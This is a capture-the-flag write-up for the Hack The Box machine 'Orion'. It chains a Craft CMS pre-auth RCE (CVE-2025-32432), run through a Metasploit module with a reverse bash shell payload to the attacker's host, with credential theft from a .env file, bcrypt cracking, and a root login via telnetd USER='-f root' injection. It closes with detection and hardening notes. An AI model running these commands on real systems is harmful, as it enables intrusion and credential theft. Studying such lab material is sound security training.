# HTB: Orion — Write-Up

**OS:** Linux (Ubuntu 22.04.5 LTS)
**Difficulty:** Easy
**Attack path:** Pre-auth RCE (CVE-2025-32432) → www-data → Craft CMS DB creds → bcrypt crack → adam → telnet USER env var injection → root

---

## Enumeration

### Port Scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

Raw IP on port 80 returns a `302 → http://orion.htb/`. Added to `/etc/hosts`:

```
<IP>  orion.htb
```

### Web Fingerprinting

WhatWeb and Wappalyzer confirmed: **Craft CMS 5.6.16**, PHP, Yii2 framework (2.0.51), nginx 1.18.0 reverse proxy, Ubuntu host.

The admin control panel login page at `http://orion.htb/admin` disclosed the version in the footer:

```
Craft CMS 5.6.16
```

Key JS globals extracted from the login page source:

```
actionTrigger: "actions"
actionUrl: "http://orion.htb/index.php?p=admin/actions/"
pathParam: "p"
cpTrigger: "admin"
useEmailAsUsername: false
```

Session cookie name: `CraftSessionId` (not `PHPSESSID` — critical for PoC compatibility).

`devMode` confirmed active — the app returns full Yii2 stack traces with `$_COOKIE` and `$_SESSION` dumps, which proved useful throughout exploitation.

### Directory Enumeration

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt \
     -u http://orion.htb/FUZZ -fs 12272
```

`-fs 12272` filters the homepage echoed by Craft's pagination parameter (`p`). Meaningful results:

```
/admin   302  (Craft CMS control panel)
/assets  301 → 403  (directory listing disabled)
/logout  302
```

---

## Foothold — CVE-2025-32432 (Craft CMS Pre-Auth RCE)

### Vulnerability Background

**CVE-2025-32432** (CVSS 10.0) is an unauthenticated RCE in Craft CMS versions 3.x, 4.x, and 5.x, discovered by Orange Cyberdefense/SensePost during an in-the-wild incident. The vulnerability resides in the image transformation feature.

Craft exposes `actions/assets/generate-transform` without authentication. In versions 4.x/5.x, the asset ID is validated *after* object creation, meaning the Yii PhpManager gadget chain executes before validation. Sending a POST with a crafted `handle` object containing `__class: yii\rbac\PhpManager` and a controlled `itemFile` causes Craft to deserialize attacker-controlled input, leading to arbitrary code execution.

**Patched in:** Craft CMS 5.6.17 / Yii2 2.0.50.

### Exploit Steps

The session cookie mismatch (`CraftSessionId` vs `PHPSESSID`) broke most public Python PoCs. The Metasploit module handled this correctly. Asset ID 31 was valid on this instance.

```
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
set RHOSTS http://orion.htb
set ASSET_ID 31
set PAYLOAD php/unix/cmd/reverse_bash
set LHOST <tun0>
set LPORT 443
exploit
```

`php/unix/cmd/reverse_bash` is key — it fires a `/dev/tcp` bash shell as a detached OS process, avoiding the PHP request lifecycle problem that killed both native Meterpreter (`core_loadlib` died with the request) and `php/reverse_php` (inline shell died with the PHP process).

Shell received as `www-data`.

### Shell Stabilisation

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm SHELL=bash
stty rows 50 cols 200
```

---

## Lateral Movement — www-data → adam

### Credential Extraction

Working directory on landing: `/var/www/html/craft/config`. The Craft `.env` was readable:

```
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
```

### Database Enumeration

```bash
mysql -u root -p'SuperSecureCraft123Pass!' -h 127.0.0.1 orion
```

```sql
SELECT username, password, email FROM users;
```

Result:

```
adam | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

### Hash Cracking

```bash
hashcat -m 3200 adam.hash /usr/share/wordlists/rockyou.txt
```

Cracked in 50 seconds:

```
$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
```

`$2y$` = bcrypt, cost factor 13 (PHP blowfish). Hashcat mode 3200.

### SSH Access

```bash
ssh adam@orion.htb
# password: darkangel
```

```
adam@orion:~$ cat user.txt
<user_flag>
```

---

## Privilege Escalation — adam → root

### Enumeration Highlights (LinPEAS)

Key findings from LinPEAS:

```
tcp  0  0  127.0.0.1:23  0.0.0.0:*  LISTEN   inetutils-inetd
```

A **telnet** service listening only on localhost — unusual on any modern box, intentional on an HTB box. The inetd process was confirmed running.

Additional SUID of interest: `/usr/bin/pkexec 0.105` (potentially CVE-2021-4034/PwnKit) and writable `/usr/local/bin/composer`. PwnKit segfaulted on the pre-compiled binary and the berdav PoC returned the partial "PWNKIT gconv" output indicating the exploit path was partially mitigated/patched. The telnet vector was ultimately cleaner.

### Exploitation — inetutils-telnetd USER Environment Variable Injection

`inetutils-telnetd` supports the `-a` (auto-login) flag, which reads the `USER` environment variable to determine who to log in as. This is intended for trusted network environments. Critically, the `telnetd` on this box does **not** validate that the user specified via `-f` is non-root or that a password is required.

By setting `USER="-f root"` before invoking `telnet -a`, the `-f root` string is passed as the username, which inetutils-telnetd interprets as a forced login to root — bypassing password authentication entirely:

```bash
USER="-f root" telnet -a 127.0.0.1
```

This drops directly into a root shell:

```
root@orion:~# id
uid=0(root) gid=0(root) groups=0(root)

root@orion:~# cat /root/root.txt
<root_flag>
```

---

## Blue Team / Detection Notes

### CVE-2025-32432 Detection

The vendor-recommended signature: inspect POST body of requests to `actions/assets/generate-transform` for the string `__class`. This covers both the direct object injection and session-file variants.

Log pattern to alert on:

```
POST /index.php?p=admin/actions/assets/generate-transform
body contains: __class
```

Asset ID enumeration phase generates multiple POST requests to the same endpoint with incrementing `assetId` values and an otherwise minimal body — a burst of these before the payload POST is a reliable indicator of active exploitation.

### Credential Storage

MySQL root credentials in a plaintext `.env` file owned by `www-data` meant an unauthenticated web exploit immediately yielded database root. The `CRAFT_DB_USER` should never be `root`, and `.env` should not be readable by the web application user beyond what is strictly required.

### User Password

`darkangel` is within the first ~700 entries of `rockyou.txt`. bcrypt cost factor 13 slowed cracking to ~14 H/s but did not prevent it within one minute on consumer hardware. Passwords of this quality are inadequate even with strong hashing.

### Telnet / inetutils-inetd

`inetutils-inetd` exposes a telnet service on `127.0.0.1:23`. This service class (legacy r-services and telnet) should not exist on modern hosts. The USER environment variable injection into `telnetd`'s auto-login mechanism is a known behaviour of inetutils — the `-f` flag bypasses password authentication entirely, and no validation prevents its use against the root account. Recommend: remove `inetutils-inetd` entirely, or at minimum ensure `telnetd` is not configured as a service.

### devMode in Production

`CRAFT_DEV_MODE=true` in a production-facing environment caused the application to return full PHP stack traces, `$_COOKIE` values, and `$_SESSION` contents in error responses. This significantly aided reconnaissance and should always be disabled in any internet-facing environment.

---

## Attack Chain Summary

```
Recon
└─ Craft CMS 5.6.16 identified (version in footer)
   └─ CVE-2025-32432 pre-auth RCE
      └─ POST /index.php?p=admin/actions/assets/generate-transform
         └─ Yii PhpManager gadget → www-data shell
            └─ .env: CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
               └─ MySQL root → Craft users table → adam bcrypt hash
                  └─ hashcat -m 3200 → darkangel
                     └─ SSH as adam → user.txt
                        └─ telnet 127.0.0.1:23 (inetutils-inetd)
                           └─ USER="-f root" telnet -a → root shell → root.txt
```
